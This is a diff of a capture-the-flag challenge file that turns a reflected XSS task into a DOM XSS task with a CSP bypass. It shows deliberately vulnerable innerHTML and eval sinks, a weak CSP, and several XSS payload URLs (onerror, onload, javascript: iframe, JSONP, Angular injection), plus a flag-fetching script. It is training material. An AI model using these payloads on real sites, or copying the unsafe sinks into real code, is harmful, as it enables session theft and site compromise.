@@ -1,31 +1,88 @@
-# Challenge 15: XSS Reflected
+# Challenge 15: DOM XSS with CSP Bypass (Upgraded)
 # Category: Web
-# Points: 300
-# Difficulty: Medium
+# Points: 400
+# Difficulty: MEDIUM-HARD
 
 ## Description
-This search page seems vulnerable. Can you exploit it to get the flag?
+This website has Content Security Policy (CSP) protection. But can you still execute XSS?
 
-[Host the Flask app]
+**Service:** `http://HOST:5006`
 
-## Flag
-flag{xss_can_execute_arbitrary_javascript}
+## What is DOM XSS?
+
+Unlike reflected XSS, DOM XSS executes entirely in the browser:
+- Server doesn't reflect input in response
+- JavaScript processes user input unsafely
+- Payload never touches the server
+
+## The Challenge
+
+### Vulnerable JavaScript
+```javascript
+// Vulnerable: Using innerHTML with user input
+document.getElementById('output').innerHTML = location.hash.slice(1);
+
+// Or: eval() with user data
+eval(decodeURIComponent(location.search.slice(1)));
+```
+
+### CSP Header
+```
+Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline'
+```
+
+This CSP:
+- Allows scripts from same origin
+- Allows inline scripts (weak!)
+- Blocks external scripts
+
+## Solution Approaches
+
+### 1. Basic DOM XSS via Hash
+```
+http://localhost:5006#<img src=x onerror=alert('XSS')>
+```
+
+### 2. Event Handler Injection
+```
+http://localhost:5006#<svg/onload=alert('XSS')>
+```
+
+### 3. Iframe Injection (if allowed)
+```
+http://localhost:5006#<iframe src="javascript:alert('XSS')">
+```
+
+### 4. CSP Bypass with JSONP (if endpoints exist)
+```
+http://localhost:5006#<script src="/api/jsonp?callback=alert"></script>
+```
+
+### 5. Angular Injection (if Angular is used)
+```
+http://localhost:5006#{{constructor.constructor('alert(1)')()}}
+```
+
+## Tools Needed
+- Burp Suite - Request interception
+- Browser DevTools - DOM inspection
+- XSS Hunter - Payload generation
+- CyberChef - Encoding
 
 ## Solution
-Inject JavaScript via the search parameter:
-
-```
-http://localhost:5005?q=<script>alert('XSS')</script>
-```
-
-Or use event handlers:
-```
-http://localhost:5005?q=<img src=x onerror=alert('XSS')>
-```
-
-The flag appears in the alert box when XSS is successfully executed.
-
-To fetch the flag from /flag endpoint:
 ```javascript
-<script>fetch('/flag').then(r=>r.text()).then(t=>alert(t))</script>
+// Extract flag via XSS
+// 1. Find DOM sink
+// 2. Craft payload
+// 3. Execute and exfiltrate flag
+
+// Example: If flag is in a cookie
+fetch('/api/flag').then(r=>r.text()).then(t=>alert(t))
 ```
+
+## Hints
+1. Check the JavaScript code - where does user input go?
+2. Look for DOM sinks: innerHTML, eval(), document.write()
+3. CSP 'unsafe-inline' means inline scripts work
+4. The flag might be in a cookie, localStorage, or API endpoint
+5. Try different HTML tags and event handlers
